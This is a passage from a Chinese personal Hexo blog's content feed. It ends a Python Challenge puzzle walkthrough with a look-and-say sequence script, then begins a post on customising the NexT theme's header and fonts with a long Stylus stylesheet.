class="number">300,301</span>,<span class="number">304,304</span>,<span class="number">320,305</span>,<span class="number">327,306</span>,<span class="number">332,307</span>,<span class="number">341,306</span>,<span class="number">349,303</span>,<span class="number">354,301</span>,<span class="number">364,301</span>,<span class="number">371,297</span>,<span class="number">375,292</span>,<span class="number">384,291</span>,<span class="number">386,302</span>,<span class="number">393,324</span>,<span class="number">391,333</span>,<span class="number">387,328</span>,<span class="number">375,329</span>,<span class="number">367,329</span>,<span class="number">353,330</span>,<span class="number">341,331</span>,<span class="number">328,336</span>,<span class="number">319,338</span>,<span class="number">310,341</span>,<span class="number">304,341</span>,<span class="number">285,341</span>,<span class="number">278,343</span>,<span class="number">269,344</span>,<span class="number">262,346</span>,<span class="number">259,346</span>,<span class="number">251,349</span>,<span class="number">259,349</span>,<span class="number">264,349</span>,<span class="number">273,349</span>,<span class="number">280,349</span>,<span class="number">288,349</span>,<span class="number">295,349</span>,<span class="number">298,354</span>,<span class="number">293,356</span>,<span class="number">286,354</span>,<span class="number">279,352</span>,<span class="number">268,352</span>,<span class="number">257,351</span>,<span class="number">249,350,234</span>,<span class="number">351,211</span>,<span class="number">352,197</span>,<span class="number">354,185</span>,<span class="number">353,171</span>,<span class="number">351,154</span>,<span class="number">348,147</span>,<span class="number">342,137</span>,<span class="number">339,132</span>,<span class="number">330,122</span>,<span class="number">327,120</span>,<span class="number">314,116</span>,<span class="number">304,117</span>,<span class="number">293,118</span>,<span class="number">284,118</span>,<span class="number">281,122</span>,<span class="number">275,128</span>,<span class="number">265,129</span>,<span class="number">257,131,244</span>,<span class="number">133,239,134,228</span>,<span class="number">136,221,137,214</span>,<span class="number">138,209,135,201</span>,<span class="number">132,192,130,184</span>,<span class="number">131,175,129,170</span>,<span class="number">131,159,134,157</span>,<span class="number">134,160,130,170</span>,<span class="number">125,176,114,176</span>,<span class="number">102,173,103,172</span>,<span class="number">108,171,111,163</span>,<span class="number">115,156,116,149</span>,<span class="number">117,142,116,136</span>,<span class="number">115,129,115,124</span>,<span class="number">115,120,115,115</span>,<span class="number">117,113,120,109</span>,<span class="number">122,102,122,100</span>,<span class="number">121,95,121,89</span>,<span class="number">115,87,110,82</span>,<span class="number">109,84,118,89</span>,<span class="number">123,93,129,100</span>,<span class="number">130,108,132,110</span>,<span class="number">133,110,136,107</span>,<span class="number">138,105,140,95</span>,<span class="number">138,86,141,79</span>,<span class="number">149,77,155,81</span>,<span class="number">162,90,165,97</span>,<span class="number">167,99,171,109</span>,<span class="number">171,107,161</span>,<span class="number">332,155</span>,<span class="number">348,156</span>,<span class="number">353,153</span>,<span class="number">366,149</span>,<span class="number">379,147</span>,<span class="number">394,146</span>,<span class="number">399</span>," </span><br><span class="line">        href="" /&gt;</span><br><span class="line">    &lt;area shape="poly" </span><br><span class="line">        coords="<span class="number">156,141,165,135</span>,<span class="number">169,131,176,130</span>,<span class="number">187,134,191,140</span>,<span class="number">191,146,186,150</span>,<span class="number">179,155,175,157</span>,<span class="number">168,157,163,157</span>,<span class="number">159,157,158,164</span>,<span class="number">159,175,159,181</span>,<span class="number">157,191,154,197</span>,<span class="number">153,205,153,210</span>,<span class="number">152,212,147,215</span>,<span class="number">146,218,143,220</span>,<span class="number">132,220,125,217</span>,<span class="number">119,209,116,196</span>,<span class="number">115,185,114,172</span>,<span class="number">114,167,112,161</span>,<span class="number">109,165,107,170</span>,<span class="number">99,171,97,167</span>,<span class="number">89,164,81,162</span>,<span class="number">77,155,81,148</span>,<span class="number">87,140,96,138</span>,<span class="number">105,141,110,136</span>,<span class="number">111,126,113,129</span>,<span class="number">118,117,128,114</span>,<span class="number">137,115,146,114</span>,<span class="number">155,115,158,121</span>,<span class="number">157,128,156,134</span>,<span class="number">157,136,156,136</span>" </span><br><span class="line">        href="" /&gt;</span><br><span class="line">    &lt;/map&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;font color="#<span class="number">303030</span>" size="+<span class="number">2</span>"&gt;Where is the missing link?&lt;/font&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>然后应该是个牛，要不就是羊。。。<br>我输入一个<code>http://www.pythonchallenge.com/pc/return/cow.html</code>他还告诉我<code>hmm. it&#39;s a male.</code>  </p><hr><h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a><a href="http://www.pythonchallenge.com/pc/return/bull.html" target="_blank" rel="noopener">第十关</a></h1><p>1 11 21 1211 111221 …<br>求<code>len(a[30])</code><br>1:一个一<br>11:两个一<br>21:一个二一个一<br>1211:一个一一个二两个一<br>这个顺序来的<br>直接写程序就行了:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def <span class="keyword">next</span>(arr):</span><br><span class="line">    <span class="keyword">last</span> = arr[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">count</span> = <span class="number">1</span></span><br><span class="line">    s =<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in arr[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">last</span> == i:</span><br><span class="line">            <span class="built_in">count</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s += str(<span class="built_in">count</span>)+<span class="keyword">last</span></span><br><span class="line">            <span class="keyword">last</span> = i</span><br><span class="line">            <span class="built_in">count</span> = <span class="number">1</span></span><br><span class="line">    s += str(<span class="built_in">count</span>)+<span class="keyword">last</span></span><br><span class="line">    <span class="keyword">print</span> <span class="built_in">len</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">arr = <span class="string">"1"</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    arr = <span class="keyword">next</span>(arr)</span><br></pre></td></tr></table></figure></p><p>我代码写的不好，但是正确了的。。。<br>把上面的<code>print s</code>改成<code>print len(s)</code>就可以得出答案了  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>对主题的修改</title>
      <link href="/2015/10-11-navbar/"/>
      <url>/2015/10-11-navbar/</url>
      
        <content type="html"><![CDATA[<p>我说过了我要改悬浮header还有字体的，今天都改好了。<br>现在完成了，但是移动端还有一点点小小的遗憾没有解决。<br><a id="more"></a></p><hr><h1 id="改文件"><a href="#改文件" class="headerlink" title="改文件"></a>改文件</h1><p>还是改这个文件：<br><code>/hexo/themes/next/source/css/_schemes/Mist/index.styl</code><br>先把悬浮功能做出来，然后居中，加颜色，位置微调了很多<br>然后发信啊手机端看上去很恶心。。。改了半天<br>可惜原来点击<code>site-nav-toggle</code>之后的动画没有了<br>找了一下并不是我设置<code>z-index</code>的缘由<br>实在没有办法改成了有颜色遮蔽的，还好能看<br>不知道现在看起来和原作者的是不是有很多不一样了<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Mist scheme </span></span><br><span class="line"><span class="comment">// gaoryrt changed</span></span><br><span class="line"><span class="comment">// =================================================</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.test</span> &#123; <span class="attribute">border</span>: <span class="number">10px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tags</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span> &#123; <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">0px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正文的偏移</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">0px</span>; </span><br><span class="line">  <span class="attribute">letter-spacing</span>: .<span class="number">6px</span></span><br><span class="line">    word-spacing: <span class="number">0px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链接下划线的颜色</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">a</span> &#123; <span class="attribute">border-bottom-color</span>: <span class="variable">$grey-light</span>; </span><br><span class="line">  <span class="comment">//background-color: gray</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个是分割线的设置</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">hr</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">10px</span> -<span class="number">20px</span> <span class="number">40px</span> -<span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">2px</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列表的样式(尚未尝试有可能不是这个)</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123; <span class="attribute">list-style</span>: circle; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Components  阅读全文</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.headband</span> &#123; <span class="comment">//display: none; </span></span><br><span class="line">    <span class="attribute">background-color</span>: white;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">40px</span> <span class="number">0px</span>;</span><br><span class="line">    </span><br><span class="line">    +mobile() &#123;</span><br><span class="line">    <span class="attribute">display</span>: none; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Header 头·顶栏</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.header</span> &#123; </span><br><span class="line">    <span class="attribute">z-index</span>:<span class="number">8</span>;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">43px</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">background</span>: rgb(<span class="number">245</span>,<span class="number">245</span>,<span class="number">245</span>)</span><br><span class="line">    border-bottom: <span class="number">2px</span> solid rgb(<span class="number">234</span>,<span class="number">234</span>,<span class="number">234</span>);</span><br><span class="line">    </span><br><span class="line">+mobile() &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">30px</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">30px</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    clearfix();               <span class="comment">//清晰修正</span></span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">0px</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.site-nav</span>&#123;</span><br><span class="line">  <span class="attribute">background-color</span>: rgb(<span class="number">234</span>,<span class="number">234</span>,<span class="number">234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 博客名</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.site-meta</span> &#123;</span><br><span class="line">    </span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">17px</span>;</span><br><span class="line">  </span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">8px</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">1px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.brand</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$black-deep</span>;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line"></span><br><span class="line">    +mobile() &#123; <span class="attribute">display</span>: block; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.logo</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.site-title</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">26px</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">"PingFang"</span>, Verdana, sans-serif;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: -<span class="number">2px</span></span><br><span class="line">    word-spacing: -<span class="number">4px</span>;</span><br><span class="line">    </span><br><span class="line">    +mobile() &#123; </span><br><span class="line"></span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">34px</span>; </span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">24px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 博客名字上下的两条线</span></span><br><span class="line"><span class="comment">// ------------------------------------------</span></span><br><span class="line"><span class="selector-class">.logo-line-before</span>,</span><br><span class="line"><span class="selector-class">.logo-line-after</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0px</span>;                        <span class="comment">//这个改成0就没有上下两行了</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="variable">$black-deep</span>;</span><br><span class="line">    +mobile() &#123; <span class="attribute">height</span>: <span class="number">3px</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.use-motion</span> &#123;</span><br><span class="line">  <span class="selector-class">.logo-line-before</span> <span class="selector-tag">i</span> &#123; <span class="attribute">left</span>: -<span class="number">100%</span>; &#125;</span><br><span class="line">  <span class="selector-class">.logo-line-after</span> <span class="selector-tag">i</span> &#123; <span class="attribute">right</span>: -<span class="number">100%</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Menu  顶栏右边的导航</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.site-nav-toggle</span> &#123;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">position</span>: static;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0px</span> -<span class="number">24px</span> <span class="number">0</span> <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">21px</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">"PingFang"</span>, Verdana, sans-serif;</span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">400</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">br</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.menu-item</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0</span>;</span><br><span class="line">    +mobile() &#123; <span class="attribute">display</span>: block; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.menu-item</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">    <span class="attribute">transition-property</span>: background;</span><br><span class="line"></span><br><span class="line">    +mobile() &#123;</span><br><span class="line">      <span class="attribute">text-align</span>: left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;:hover &#123; <span class="attribute">background</span>: <span class="number">#e1e1e1</span>; &#125;       <span class="comment">//指针指到的时候背景色</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">a</span>::before &#123;</span><br><span class="line">      <span class="attribute">display</span>: none;</span><br><span class="line"></span><br><span class="line">      +mobile() &#123; <span class="attribute">display</span>: block; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123; <span class="attribute">float</span>: none; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu-left</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  +mobile() &#123; <span class="attribute">float</span>: none; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu-item-icon</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Search 搜索栏</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.site-search</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">8px</span>;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">float</span>: none;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">input</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">3px</span>;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">140px</span>;</span><br><span class="line">    <span class="attribute">background</span>: url(<span class="variable">$search-icon</span>) no-repeat <span class="number">0</span> <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">12px</span> <span class="number">12px</span>;</span><br><span class="line">    <span class="attribute">outline</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="variable">$grey-dark</span>;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">    &amp;:focus &#123; <span class="attribute">opacity</span>: <span class="number">1</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Post Expanded  文章</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.posts-expand</span> &#123;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-title</span>,</span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">text-align</span>: <span class="variable">$site-meta-text-align</span>;</span><br><span 